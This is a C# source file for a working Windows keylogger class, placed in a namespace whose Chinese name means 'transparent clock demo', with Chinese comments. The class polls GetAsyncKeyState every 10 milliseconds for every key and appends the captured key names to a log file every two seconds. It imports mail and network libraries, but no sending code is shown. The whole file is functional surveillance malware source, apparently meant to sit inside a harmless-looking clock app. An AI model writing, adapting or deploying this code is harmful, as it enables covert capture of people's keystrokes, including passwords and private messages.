using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Net.Mime;
using System.Net;
using System.Drawing;

namespace 透明时钟演示
{
    public class Keylogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        private System.String keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private System.Timers.Timer timerBufferFlush;
        private StreamWriter sw;
        private long keyGetInterval = 0;
        private long flushToFileInterval = 0;
        private string logFileName;
        private bool hasStart;
        
         public long KeyGetInterval
        {
             // 获取键盘输入的间隔时间
            set
            {
                keyGetInterval = value;
                timerKeyMine.Interval = keyGetInterval;
            }
            get
            {
                return keyGetInterval;
            }
        }

        public long FlushToFileInterval
        {// 记录键盘输入到文件的间隔时间
            set
            {
                flushToFileInterval = value;

                timerBufferFlush.Interval = flushToFileInterval;
            }

            get
            {
                return flushToFileInterval;
            }
        }
        
        public bool HasStart
        {
        	get
        	{
        		return hasStart;
        	}
        }

        public Keylogger(string logFileName)
        {
            this.logFileName = logFileName;
            timerKeyMine = new System.Timers.Timer();
            timerBufferFlush = new System.Timers.Timer();
            timerKeyMine.Interval = 10;
            timerBufferFlush.Interval = 2000;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
        }
        
        public void startLoging()
        {// 开始键盘记录
            timerKeyMine.Start();
            timerBufferFlush.Start();
            hasStart=true;
        }

        public void stopLoging()
        {// 停止键盘记录
            timerKeyMine.Stop();
            timerBufferFlush.Stop();
            hasStart=false;
        }

        private void timerKeyMine_Elapsed(object sender,System.Timers.ElapsedEventArgs e)
        {
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    keyBuffer += Enum.GetName(typeof(Keys), i) + " ";
                }
            }
        }

        private void timerBufferFlush_Elapsed(object sender,System.Timers.ElapsedEventArgs e)
        {
            // 刷新记录文件
            try
            {
                // 追加记录数据到文件
                sw = new StreamWriter(this.logFileName, true);
                sw.Write(keyBuffer);
                sw.Close();

                // 清空缓冲 
                keyBuffer = string.Empty;
            }
            catch
            {
                return;
            }
        }
    }
}

